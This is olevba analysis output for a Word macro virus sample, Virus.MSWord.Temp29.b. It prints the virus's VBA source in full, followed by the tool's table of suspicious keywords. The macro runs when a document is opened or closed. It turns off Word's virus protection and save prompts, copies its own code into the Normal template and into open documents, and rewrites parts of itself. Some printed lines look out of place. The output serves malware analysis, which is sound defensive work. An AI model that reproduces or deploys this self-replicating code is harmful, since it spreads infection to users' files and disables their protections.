olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Temp29.b-4ff0c68aae5e2b314a2b599485605cb30672aebf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Temp29.b-4ff0c68aae5e2b314a2b599485605cb30672aebf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
With Options:
    .ConfirmConversions = False:
    .VirusProtection = False:
    .SaveNormalPrompt = False:
    .SavePropertiesPrompt = False:
End With
s = ActiveDocument.Saved
sName = "c:\evolve.tmp"
sFunc = "Private Sub Document_Open()"
Found = False
If Dir(sName) <> "" Then Kill sName
Open sName For Output As #1
For i = 0 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    If Found = False And (a = sFunc) Then Found = True
.replaceline 1, "Sub AutoOpen()"
    If a = "End Sub" And Found = True Then Found = False
Next i
.replaceline 28, "Sub ToolsMacro()"
j = 1
k = 1
t = 0
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
    Set nml = NormalTemplate.VBProject.VBComponents.Item(1)
Sub ToolsMacro()
End If
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
    Set atv = ActiveDocument.VBProject.VBComponents.Item(1)
    t = t + 2
End If
If t > 0 Then
    Open sName For Input As #1
    If LOF(1) = 0 Then GoTo quit
    i = 1
    Do While Not EOF(1)
        Line Input #1, a
        If t = 1 Or t = 3 Then
            nml.CodeModule.InsertLines j, a
            j = j + 1
        End If
        If t = 2 Or t = 3 Then
            atv.CodeModule.InsertLines k, a
            k = k + 1
        End If
    Loop
quit:
    Close #1
End If
With Dialogs(wdDialogFileSumaryInfo):
    .Title = "Ethan Frome":
    .Author = "EW/LN/CB":
    .Keywrds = "Ethan":
    .Execute:
End With
If Left(ActiveDocument.Name, 8) <> "Document" Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
Kill sName
Application.EnableCancelKey = wdCancelInterrupt
End Sub
Sub AutoClose()
On Error GoTo ou: Options.VirusProtection = False: Options.SaveNormalPrompt = False: Options.ConfirmConversions = False
Set NTVBC = NormalTemplate.VBProject.VBComponents.Item(1): Set ADVBC = ActiveDocument.VBProject.VBComponents.Item(1)
ad = ADVBC.CodeModule.CountOfLines: nt = NTVBC.CodeModule.CountOfLines: EXPFN = Environ("temp") & "\~CL7610_2.~MP"
If nt > 28 And ad > 28 Then GoTo ou
If nt < 29 Then
    Set dhst = NTVBC
    Set shst = ADVBC
Else
    Set dhst = ADVBC
    Set shst = NTVBC
End If
shst.Name = dhst.Name
shst.Export (EXPFN)
With dhst.CodeModule
.AddFromFile (EXPFN)
.deletelines 1, 4
temp$ = .Lines(1, 1)
.replaceline 1, "Sub AutoOpen()"
.replaceline 19, ".replaceline 1," & Chr$(34) & temp$ & Chr$(34)
temp$ = .Lines(28, 1)
.replaceline 28, "Sub ToolsMacro()"
.replaceline 22, ".replaceline 28," & Chr$(34) & temp$ & Chr$(34)
End With
Kill (EXPFN)
ou:
End Sub
Sub ViewVBCode()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

